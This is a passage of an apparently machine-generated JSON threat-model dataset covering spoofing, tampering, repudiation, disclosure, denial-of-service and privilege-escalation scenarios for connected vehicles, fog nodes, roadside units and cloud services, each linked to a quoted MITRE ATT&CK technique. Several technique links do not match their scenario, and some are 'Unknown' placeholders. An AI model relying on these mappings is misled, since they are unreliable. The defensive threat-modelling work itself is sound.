                    "Condition": "Data validation procedures are absent or insufficient."
                },
                {
                    "Assumption": "Access to intermediate data flows",
                    "Role": "Attacker",
                    "Condition": "Data in transit is not secure."
                }
            ],
            "Potential Impact": "Incorrect real-time processing, leading to potential vehicle mishaps.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data manipulation",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Hackers insert false vehicle status information into the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Lack of data integrity checks",
                    "Role": "Cloud Service Provider",
                    "Condition": "Data verification mechanisms are weak or non-existent."
                },
                {
                    "Assumption": "Compromised edge devices",
                    "Role": "Attacker",
                    "Condition": "Devices at the network edge are unprotected."
                }
            ],
            "Potential Impact": "Faulty data analytics, potential mismanagement of resources.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Intruders alter firmware in roadside units (RSUs) to manipulate traffic lights.",
            "Assumptions": [
                {
                    "Assumption": "Weak firmware security",
                    "Role": "Device Manufacturer",
                    "Condition": "Firmware updates are not securely managed."
                },
                {
                    "Assumption": "Physical access to RSUs",
                    "Role": "Attacker",
                    "Condition": "RSUs are physically accessible."
                }
            ],
            "Potential Impact": "Traffic control manipulation, potential accidents.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware modification",
                "RSUs"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may deploy rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting and modifying operating-system API calls that supply system information. Rootkits or rootkit-enabling functionality may reside at the user or kernel level in the operating system, or lower. (Citation: Enterprise ATT&CK January 2018)   \n\nFirmware rootkits that affect the operating system yield nearly full control of the system. While firmware rootkits are normally developed for the main processing board, they can also be developed for the I/O that is attached to an asset. Compromise of this firmware allows the modification of all of the process variables and functions the module engages in. This may result in commands being disregarded and false information being fed to the main device. By tampering with device processes, an adversary may inhibit its expected response functions and possibly enable [Impact](https://attack.mitre.org/tactics/TA0105).",
                "id": "attack-pattern--3b6b9246-43f8-4c69-ad7a-2b11cfe0a0d9",
                "technique_id": "T0851"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny commands sent from their vehicles to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging and monitoring",
                    "Role": "System Administrator",
                    "Condition": "Activity logs are not comprehensive."
                },
                {
                    "Assumption": "Lack of non-repudiation mechanisms",
                    "Role": "System Developer",
                    "Condition": "Non-repudiation protocols are not implemented."
                }
            ],
            "Potential Impact": "Difficulty in auditing and forensic investigation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging deficiency",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Attackers deny tampering with data sent to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Absence of tamper-evident logs",
                    "Role": "Cloud Service Provider",
                    "Condition": "Logs do not capture tampering activities."
                },
                {
                    "Assumption": "Lack of forensic readiness",
                    "Role": "Cloud Administrator",
                    "Condition": "Systems are not equipped for forensic analysis."
                }
            ],
            "Potential Impact": "Inability to hold attackers accountable.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud services",
                "audit logs"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny responsibility for sending malicious data packets to the system.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate network monitoring",
                    "Role": "Network Administrator",
                    "Condition": "Network traffic is not thoroughly monitored."
                },
                {
                    "Assumption": "Lack of packet-level logging",
                    "Role": "System Developer",
                    "Condition": "System does not log packet-level data."
                }
            ],
            "Potential Impact": "Challenges in addressing and mitigating attacks.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "network monitoring deficiency",
                "data packets"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive vehicle data intercepted in transit between vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted communication channels",
                    "Role": "System Architect",
                    "Condition": "Communication channels are not encrypted."
                },
                {
                    "Assumption": "Exploitation of network vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Network security is compromised."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to cloud storage where vehicle data is stored long-term.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on cloud services",
                    "Role": "Cloud Service Provider",
                    "Condition": "Access control mechanisms are weak."
                },
                {
                    "Assumption": "Compromised cloud accounts",
                    "Role": "Attacker",
                    "Condition": "Cloud accounts are compromised."
                }
            ],
            "Potential Impact": "Sensitive data exposure.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "data storage"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malware in the system exfiltrates sensitive traffic data.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient malware detection mechanisms",
                    "Role": "System Security Specialist",
                    "Condition": "Anti-malware solutions are ineffective."
                },
                {
                    "Assumption": "Compromised endpoint devices",
                    "Role": "Attacker",
                    "Condition": "Endpoints are not adequately secured."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of traffic data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "malware",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers flood fog nodes with excessive data requests, overwhelming the system.",
            "Assumptions": [
                {
                    "Assumption": "Lack of rate limiting on data requests",
                    "Role": "System Administrator",
                    "Condition": "Rate limiting is not implemented."
                },
                {
                    "Assumption": "Network is accessible to attackers",
                    "Role": "Attacker",
                    "Condition": "Network is not adequately protected."
                }
            ],
            "Potential Impact": "System unavailability, disrupting real-time services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network flood",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack against cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Lack of DDoS mitigation strategies",
                    "Role": "Cloud Service Provider",
                    "Condition": "DDoS protection is insufficient."
                },
                {
                    "Assumption": "High dependency on cloud services",
                    "Role": "System Designer",
                    "Condition": "Critical services rely heavily on cloud availability."
                }
            ],
            "Potential Impact": "Cloud service disruption, affecting long-term data analysis.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of vulnerabilities in RSUs to render them non-functional.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched vulnerabilities in RSUs",
                    "Role": "Device Manufacturer",
                    "Condition": "RSUs have known, exploitable vulnerabilities."
                },
                {
                    "Assumption": "Physical or remote access to RSUs",
                    "Role": "Attacker",
                    "Condition": "RSUs are accessible to attackers."
                }
            ],
            "Potential Impact": "Disruption in traffic management services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "RSUs",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious code exploits software vulnerabilities to gain higher privileges in fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Presence of exploitable software vulnerabilities",
                    "Role": "System Developer",
                    "Condition": "Software has unpatched vulnerabilities."
                },
                {
                    "Assumption": "No proper access controls",
                    "Role": "System Administrator",
                    "Condition": "Access control mechanisms are weak."
                }
            ],
            "Potential Impact": "Unauthorized system control, potential for wide-ranging attacks.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "software vulnerabilities",
                "fog nodes"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Unauthorized user gains administrative access to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Weak or compromised user credentials",
                    "Role": "Cloud Administrator",
                    "Condition": "User credentials are not securely managed."
                },
                {
                    "Assumption": "Insufficient multi-factor authentication",
                    "Role": "Cloud Service Provider",
                    "Condition": "Multi-factor authentication is not enforced."
                }
            ],
            "Potential Impact": "Complete cloud system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "credential access",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of physical access to install a backdoor in an RSU, gaining elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Physical security of RSUs is weak",
                    "Role": "Infrastructure Manager",
                    "Condition": "RSUs are accessible to unauthorized personnel."
                },
                {
                    "Assumption": "No BIOS/firmware protection",
                    "Role": "Device Manufacturer",
                    "Condition": "RSUs lack secure BIOS/firmware settings."
                }
            ],
            "Potential Impact": "Persistent unauthorized access and control.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "physical access",
                "RSUs"
            ],
            "mitre_technique": {
                "name": "Graphical User Interface",
                "description": "Adversaries may attempt to gain access to a machine via a Graphical User Interface (GUI) to enhance execution capabilities. Access to a GUI allows a user to interact with a computer in a more visual manner than a CLI. A GUI allows users to move a cursor and click on interface objects, with a mouse and keyboard as the main input devices, as opposed to just using the keyboard.\n\nIf physical access is not an option, then access might be possible via protocols such as VNC on Linux-based and Unix-based operating systems, and RDP on Windows operating systems. An adversary can use this access to execute programs and applications on the target machine.",
                "id": "attack-pattern--b0628bfc-5376-4a38-9182-f324501cb4cf",
                "technique_id": "T0823"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "21",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a valid smart vehicle to send falsified data to Fog Nodes.",
            "Assumptions": [
                {
                    "Assumption": "There is no robust authentication mechanism between vehicles and fog nodes.",
                    "Role": "Attacker",
                    "Condition": "The system does not use strong authentication."
                },
                {
                    "Assumption": "Attacker has physical access or can intercept communication channels.",
                    "Role": "Attacker",
                    "Condition": "Physical access or network proximity to the vehicles or fog nodes."
                },
                {
                    "Assumption": "Attacker can generate data packets that emulate legitimate vehicle data.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the data format and protocols used by the vehicles."
                }
            ],
            "Potential Impact": "Reduced data integrity and potential traffic disruptions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "vehicle",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a fog node, providing fake processing results to smart vehicles and the cloud.",
            "Assumptions": [
                {
                    "Assumption": "There is no mutual authentication between fog nodes and smart vehicles/cloud.",
                    "Role": "Attacker",
                    "Condition": "The system does not enforce mutual authentication."
                },
                {
                    "Assumption": "Attacker can create a fog node that mimics legitimate fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Access to hardware or virtualization tools to mimic fog nodes."
                },
                {
                    "Assumption": "Attacker intercepts or redirects legitimate communication to their spoofed node.",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle capability or network access."
                }
            ],
            "Potential Impact": "Misleading data processing can affect vehicle operations and cloud analytics.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "fog node",
                "data manipulation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious entity spoofs cloud services to intercept and alter data flows from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not verify the authenticity of cloud servers.",
                    "Role": "Attacker",
                    "Condition": "Absence of cloud service authentication."
                },
                {
                    "Assumption": "Attacker can intercept or manipulate network traffic between fog nodes and cloud.",
                    "Role": "Attacker",
                    "Condition": "Access to network traffic paths."
                },
                {
                    "Assumption": "Cloud service endpoints have known addresses or predictable patterns.",
                    "Role": "Attacker",
                    "Condition": "Independence of cloud endpoint configuration."
                }
            ],
            "Potential Impact": "Leaks and tampering of sensitive data; potential system-wide data integrity loss.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
